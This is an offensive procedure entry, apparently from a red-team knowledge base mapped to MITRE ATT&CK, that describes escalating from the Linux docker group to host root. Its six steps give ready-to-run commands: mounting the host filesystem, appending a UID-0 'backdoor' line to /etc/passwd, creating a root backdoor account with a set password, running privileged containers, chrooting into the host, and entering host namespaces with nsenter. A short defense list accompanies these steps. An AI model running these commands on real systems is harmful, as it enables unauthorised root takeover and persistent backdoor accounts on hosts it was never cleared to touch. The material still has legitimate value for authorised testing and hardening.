---
id: c6521327-ff10-496c-a2d0-f7aad103ede2
name: Linux-Docker-Privilege-Escalation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:19.481550+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Exploitation-for-Privilege-Escalation|T1068 - Exploitation for
    Privilege Escalation]]
sub_techniques: []
tags:
  - docker
  - linux
  - privilege-escalation
  - container-escape
commands:
  - '[[commands/docker-run-bash-with-host-root-mount]]'
  - '[[commands/useradd-backdoor-root-account]]'
  - '[[commands/docker-privileged-ubuntu-host-access]]'
  - '[[commands/docker-run-rootplease-root-shell]]'
  - '[[commands/docker-ubuntu-chroot-host-shell]]'
  - '[[commands/docker-debian-nsenter-host-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Docker]]'
validated: true
---

# Linux-Docker-Privilege-Escalation

## Summary

This procedure exploits Docker's capabilities on a Linux host to achieve privilege escalation from a low-privileged user to root access. By leveraging access to the Docker socket (/var/run/docker.sock), typically granted to users in the 'docker' group, an attacker can run containers with host filesystem mounts, privileged modes, or namespace sharing to access and control the host system. Methods include mounting the host root filesystem for direct file manipulation, spawning privileged containers that share host processes and networks, and using specialized images or tools like nsenter for full host namespace entry.

## Description

Docker containers run as root by default, and with access to the Docker daemon, an attacker can manipulate the host environment without direct root privileges on the host. This is particularly dangerous in environments where non-root users are added to the docker group for convenience. The procedure covers multiple complementary techniques: filesystem mounting to edit critical files like /etc/passwd, privileged container execution to interact with host processes and network interfaces, and namespace manipulation to enter the host's PID, mount, user, and network namespaces. These methods allow reading sensitive data, creating backdoor accounts, or obtaining an interactive root shell. The target is a Linux host with Docker installed and the attacker having local shell access as a non-root user in the docker group. Success grants full root control, enabling persistence, data exfiltration, or lateral movement.

## Requirements

1. Local shell access on a Linux host with Docker installed and running.
2. The current user must be in the 'docker' group (check with `groups | grep docker`) or have read/write access to /var/run/docker.sock.
3. No sudo privileges required initially, but some methods assume container-internal root execution.
4. Internet access for pulling Docker images (e.g., ubuntu, chrisfosterelli/rootplease).
5. Basic knowledge of Linux commands and Docker syntax.

## Defense

- Avoid adding untrusted users to the 'docker' group; use fine-grained RBAC or rootless Docker mode.
- Restrict Docker socket permissions (chmod 660 /var/run/docker.sock, chown root:docker).
- Enable container security profiles like AppArmor, SELinux, or seccomp to limit host access.
- Monitor Docker events with `docker events` or audit logs for suspicious container spawns (e.g., privileged flags, volume mounts to /).
- Use tools like Docker Bench for Security to audit configurations and Falco for runtime monitoring of container escapes.

## Objectives

1. Gain read/write access to the host filesystem to inspect or modify sensitive files.
2. Create persistent backdoor accounts with root privileges on the host.
3. Obtain an interactive root shell on the host for further post-exploitation.
4. Demonstrate full control over host processes, network, and resources via container escapes.

## Instructions

### Step 1: Mount Host Root Filesystem in Bash Container

**Context**: Start a bash container with the host's root filesystem mounted read-write at /host. This allows direct access to host files from within the container, where the process runs as root. Use this to view or edit files like /etc/passwd without host-level privileges.

**Command** ([[commands/docker-run-bash-with-host-root-mount]]):
```bash
docker run -it -v /:/host bash
```

> This command pulls the 'bash' image if needed and starts an interactive session. Once inside the container, navigate to /host/etc to access host files. For example, view the passwd file with `cat /host/etc/passwd`. Expected: List of host user accounts. If the mount succeeds, you can edit files (e.g., `echo 'backdoor:x:0:0::/root:/bin/bash' >> /host/etc/passwd`) to create a root-equivalent user, then exit the container and log in as that user on the host.

### Step 2: Add Backdoor Root Account Using useradd

**Context**: Within a mounted container (from Step 1), use standard Linux commands to create a backdoor user with UID/GID 0 (root). This persists on the host after container exit. The chpasswd variant allows non-interactive password setting.

**Command** ([[commands/useradd-backdoor-root-account]]):
```bash
useradd -ou 0 -g 0 -m backdoor && echo 'backdoor:password' | chpasswd
```

> Run this inside the container with host mounted (e.g., after Step 1). The -ou 0 sets UID to root, -g 0 sets GID to root, -m creates home dir. chpasswd sets the password non-interactively. Expected: New user 'backdoor' with root privileges. Verify on host with `su backdoor` using password 'password'. Why: Bypasses host sudo restrictions by leveraging container root to modify host passwd.

### Step 3: Run Privileged Ubuntu Container for Host Process and Network Access

**Context**: Launch an Ubuntu container in privileged mode, sharing the host's PID and network namespaces. This allows viewing and interacting with all host processes (e.g., ps aux) and using host network interfaces as if on the host itself, escalating visibility and control.

**Command** ([[commands/docker-privileged-ubuntu-host-access]]):
```bash
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

> The --privileged flag grants extended capabilities, --pid=host shares process namespace, --net=host shares network, -v /:/host mounts filesystem. Expected: Bash shell inside container where `ps aux` shows all host processes, `ifconfig` shows host interfaces, and you can execute commands as root on host resources. Decision: If image not present, it pulls automatically; use --rm to clean up post-execution.

### Step 4: Spawn Root Shell Using rootplease Image

**Context**: Use a pre-built image designed for privilege escalation via Docker. It mounts the host filesystem and chroots into it, providing a direct root shell without additional flags.

**Command** ([[commands/docker-run-rootplease-root-shell]]):
```bash
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```

> This pulls the image if needed and runs it interactively (-i -t), mounting host at /hostOS. Expected: Output shows image pull progress, then drops into a root shell (confirm with `id` showing uid=0(root)). Press Ctrl-D to exit. Why: The image automates chroot and setup for quick root access; ideal for rapid escalation.

### Step 5: Chroot into Host Using Ubuntu Container

**Context**: Run an Ubuntu container with host mount, then use chroot to switch the root directory to the host's filesystem, effectively running a shell as if on the host.

**Command** ([[commands/docker-ubuntu-chroot-host-shell]]):
```bash
docker run -v /:/host -it ubuntu chroot /host /bin/bash
```

> Mounts host at /host and immediately chroots into it, starting bash. Expected: Direct root bash shell on host ( `id` confirms root). If /bin/bash not available, fallback to /bin/sh. Decision: If socket access is restricted (e.g., in cloud like GKE), prepend `docker -H unix:///var/run/docker.sock`; otherwise, standard works.

### Step 6: Enter Host Namespaces Using nsenter in Debian Container

**Context**: Use a Debian container in privileged mode with host PID, then nsenter to join all host namespaces (mount, user, network, IPC), gaining full host control without chroot.

**Command** ([[commands/docker-debian-nsenter-host-shell]]):
```bash
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i -p sh
```

> --privileged and --pid=host enable namespace access; nsenter targets PID 1 (init), joining mount (-m), user (-u), net (-n), ipc (-i), pid (-p) namespaces, starting sh. Expected: Root shell on host ( `id` shows root, `ps` shows host processes). Why: Bypasses some container isolation layers; requires nsenter installed in image (Debian has it).

**Expected Output**: Across methods, success is confirmed by root shell access (uid=0), ability to read /etc/shadow, or execute host-only commands like reboot. If commands fail with permission errors, verify docker group membership.
